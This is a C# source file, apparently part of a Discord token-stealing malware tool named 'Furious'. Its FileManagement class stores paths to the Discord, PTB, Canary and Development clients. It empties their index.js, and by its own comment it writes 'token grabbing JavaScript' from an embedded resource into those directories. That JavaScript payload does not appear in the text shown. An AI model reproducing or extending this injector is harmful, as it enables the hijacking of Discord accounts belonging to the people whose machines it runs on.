using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Threading.Tasks;

namespace Furious
{
	internal class FileManagement
	{
		internal static string DevelopmentPath
		{
			get { return _developmentpath; }
			set
			{
				_developmentpath = value;
			}
		}
		internal static string PTBPath
		{
			get { return _ptbpath; }
			set
			{
				_ptbpath = value;
			}
		}
		internal static string DiscordPath
		{
			get { return _discordpath; }
			set
			{
				_discordpath = value;
			}
		}

		internal static string CanaryPath
		{
			get { return _canarypath; }
			set
			{
				_canarypath = value;
			}
		}

		///Clears the targeted file of its contents.
		internal static async Task CleanFile(string path)
		{
			try
			{
				using (StreamWriter streamWriter = new StreamWriter(path))
				{
					await streamWriter.WriteAsync(string.Empty);
				}
			}
			catch
			{
				Debug.WriteLine("An error occured clearing index.js.");
			}
		}

		///Writes the token grabbing JavaScript code into available Discord directories.
		internal static async Task WriteDiscord(string path, string javascriptPath)
		{
			if (File.Exists(path))
			{
				try
				{
					string value = string.Empty;
					using (StreamReader reader = new StreamReader(Assembly.GetExecutingAssembly().GetManifestResourceStream(javascriptPath)))
					{
						value = await reader.ReadToEndAsync();
					}
					using (StreamWriter writer = new StreamWriter(path))
					{
						await writer.WriteAsync(value);
					}
				}
				catch
                		{
					Debug.WriteLine("Error writing to " + path);
                		}
			}
		}

		internal static string _ptbpath;
		internal static string _discordpath;
		internal static string _canarypath;
		internal static string _developmentpath;
	}
}
